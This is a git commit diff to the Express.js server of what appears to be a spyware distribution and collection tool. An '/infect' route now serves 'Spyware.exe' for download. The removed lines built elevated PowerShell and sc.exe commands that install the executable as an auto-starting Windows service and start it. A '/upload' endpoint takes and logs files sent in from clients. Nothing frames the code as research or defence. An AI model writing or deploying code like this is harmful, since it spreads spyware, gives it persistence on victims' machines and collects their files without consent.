7bf4e9103c699612307726d52ce27d8e6733de34
idiarj <idiar16@gmail.com>
2025-03-17 09:44:33 -0400

    sadasd

--- app/app.js
+++ app/app.js
@@ -9,8 +9,6 @@ import multer from 'multer';
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-
-
 const app = express();
 app.use(express.json());
 app.use(cors());
@@ -28,53 +26,22 @@ const storage = multer.diskStorage({
 const upload = multer({ storage });
 
 app.get('/infect', (req, res) => {
-    const spywareExePath = path.join(__dirname, '../Spyware.exe');
-    const installServPath = path.join(__dirname, '../commands/installServ.bat');
-    const startServPath = path.join(__dirname, '../commands/exec_startServ.bat');
-    console.log('Infecting...');
-    console.log('Spyware path:', spywareExePath);
-    const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create Spyware binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;
-    const startServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'start Spyware' -Verb runAs"`;
+    try {
+        const spywareExePath = path.join(__dirname, '../Spyware.exe');
+        console.log('Infecting client...');
+        console.log(spywareExePath);
+        res.download(spywareExePath, 'Spyware.exe');
+    } catch (error) {
+        console.error('Error infecting:', error);
+        res.status(500).json({ error: 'Error infecting' });
+        
+    }
 
-    res.status(200).json({
-        message: 'Infection successful',
-        spywarePath: spywareExePath,
-        installServCmd,
-        startServCmd
-    });
-
-    // Ejecutar el script de instalación del servicio
-    // exec(installServCmd, (error, stdout, stderr) => {
-    //     if (error) {
-    //         console.error(`Error ejecutando installServ.bat: ${error.message}`);
-    //         return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
-    //     }
-    //     if (stderr) {
-    //         console.error(`Stderr en installServ.bat: ${stderr}`);
-    //     }
-    //     console.log(`Resultado installServ.bat: ${stdout}`);
-
-    //     // Esperar 2 segundos antes de iniciar el servicio
-    //     setTimeout(() => {
-    //         exec(`"${startServPath}"`, (error, stdout, stderr) => {
-    //             if (error) {
-    //                 console.error(`Error ejecutando startServ.bat: ${error.message}`);
-    //                 return res.status(500).send(`Error ejecutando el comando: ${error.message}`);
-    //             }
-    //             if (stderr) {
-    //                 console.error(`Stderr en startServ.bat: ${stderr}`);
-    //             }
-    //             console.log(`Resultado startServ.bat: ${stdout}`);
-    //             res.status(200).json({
-    //                 message: 'Infection successful',
-    //                 spywarePath: spywareExePath
-    //             });
-    //         });
-    //     }, 2000);
-    // });
 });
 
 app.post('/upload', upload.single('file'), (req, res) => {
+    console.log('Uploading file...');
+    console.log(req.file);
     if (!req.file) {
         return res.status(400).send('No file uploaded.');
     }
